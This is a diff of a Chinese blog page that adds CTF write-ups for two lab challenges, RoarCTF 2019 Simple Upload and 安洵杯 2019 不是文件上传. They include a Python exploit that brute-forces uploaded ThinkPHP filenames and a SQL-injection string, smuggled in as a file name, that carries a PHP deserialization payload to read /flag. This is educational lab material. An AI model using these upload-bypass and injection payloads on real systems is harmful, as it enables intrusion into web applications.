@@ -156,7 +156,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    1.6k 字
+                    2.3k 字
                   </span>
                 
 
@@ -166,7 +166,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    30
+                    40
                      分钟
                   </span>
                 
@@ -435,6 +435,91 @@ $phar-&gt;stopBuffering();
 <p>生成phar，按流程上传，记录文件名</p>
 <p>发包:</p>
 <p><img src="https://s1.ax1x.com/2020/05/14/YDtAJA.png" srcset="/img/loading.gif" alt="YDtAJA.png"></p>
+<h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p><strong>考点:</strong></p>
+<p><strong>1：Think PHP上传默认路径</strong></p>
+<p>默认上传路径是/home/index/upload</p>
+<p><strong>2：Think PHP upload()多文件上传</strong><br>think PHP里的upload()函数在不传参的情况下是批量上传的，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传便可以绕过文件后缀的检测，至于为什么上传两次1.txt,是为了获取php文件的后缀，因为这里的后缀命名方式运用了<strong>uniqid函数</strong>它是基于微秒的当前时间来更改文件名的，两个同时上传生成的文件名相差不会太远。<br><strong>3ThinkPHP 上传文件名爆破</strong></p>
+<p>先上传一个正常文件再上传一个木马文件，然后再上传一个正常文件，然后根据第一和第三个正常文件的文件名之间的差异，爆破出我们上传的木马文件</p>
+<p>exp.py  记得修改日期</p>
+<pre><code class="hljs undefined">import requests
+
+def GetSimple_Upload(url):
+    path = url + &quot;/?m=home&amp;c=index&amp;a=upload&quot;
+    files = &#123;&quot;file&quot;:(&quot;flag0.txt&quot;,&apos;a&apos;), &quot;file1&quot;:(&quot;flag0.php&quot;, &apos;&lt;?php phpinfo();&apos;)&#125;
+    r = requests.post(path, files=files)
+    t1 = r.text.split(&quot;/&quot;)[-1].split(&quot;.&quot;)[0]
+    print(t1)
+    t1 = int(t1, 16)
+    print(t1)
+
+    j = t1
+    while True:
+        path = url + &quot;/Public/Uploads/2020-05-14/&#123;0&#125;.php&quot;.format(hex(j)[2:])
+        try:
+            r = requests.get(path, timeout=1)
+        except:
+            continue
+        if r.status_code != 404:
+            print (path,r.text)
+            break
+        print(j, hex(j)[2:], r.status_code)
+        j -= 1
+
+if __name__ == &apos;__main__&apos;:
+    url = &quot;http://3e6586ab-f85d-4542-8b16-4b6406a52d69.node3.buuoj.cn/&quot;
+    GetSimple_Upload(url)</code></pre>
+
+<p>这里直接上传到php文件后，php内容会自动修改为flag，直接访问读取即可</p>
+<p><img src="https://s1.ax1x.com/2020/05/14/YD6pLj.png" srcset="/img/loading.gif" alt="YD6pLj.png"></p>
+<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>sql注入:</p>
+<p>回溯data是否可控</p>
+<p><img src="https://s1.ax1x.com/2020/05/14/YDRWvT.png" srcset="/img/loading.gif" alt="YDRWvT.png"></p>
+<p>一处 check,由此可以知道只有filename我们可控，而且title的值于filename有关，就是去掉后缀名的值，例如<code>filename=a.jpg</code>，那么<code>title=a</code></p>
+<p><img src="https://s1.ax1x.com/2020/05/14/YDRR2V.png" srcset="/img/loading.gif" alt="YDRR2V.png"></p>
+<p>反序列化:</p>
+<p>利用魔术方法__destruct()调用view_files的file_get_contents 读取文件</p>
+<pre><code class="hljs undefined">	public function upload($input=&quot;file&quot;)
+	&#123;
+			/***
+      $array[&quot;attr&quot;] = serialize($my_ext);
+      /***
+----------------
+	public function view_files($path)&#123;
+		if ($this-&gt;ifview == False)&#123;
+			return False;
+			//The function is not yet perfect, it is not open yet.
+		&#125;
+		$content = file_get_contents($path);
+		echo $content;
+	&#125;
+
+	function __destruct()&#123;
+		# Read some config html
+		$this-&gt;view_files($this-&gt;config);
+	&#125;</code></pre>
+
+<p>反序列化payload生成：</p>
+<pre><code class="hljs undefined">&lt;?php
+class helper &#123;
+    protected $ifview = True; 
+    protected $config = &quot;/flag&quot;;
+&#125;
+$a = new helper();
+echo serialize($a);
+?&gt;</code></pre>
+
+<p>这里的属性值ifview和config都是protected类型的，所以需要将payload修改为：</p>
+<pre><code class="hljs undefined">O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;</code></pre>
+
+<p>(以至于为什么要将修改为\0\0\0，是因为源码中在存取过程中对protected类型的属性进行了处理。)</p>
+<p>因为上传的文件名中不能有双引号，所以将payload进行16进制编码。</p>
+<p>最终payload:</p>
+<pre><code class="hljs undefined">1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&apos;1.jpg</code></pre>
+
+<p>上传图片，修改文件名为payload，发包:</p>
+<p><img src="https://s1.ax1x.com/2020/05/14/YDWOFs.png" srcset="/img/loading.gif" alt="YDWOFs.png"></p>
+<p>访问show.php,得到flag</p>
+<p><img src="https://s1.ax1x.com/2020/05/14/YDR280.png" srcset="/img/loading.gif" alt="YDR280.png"></p>
 
             </article>
             <hr>
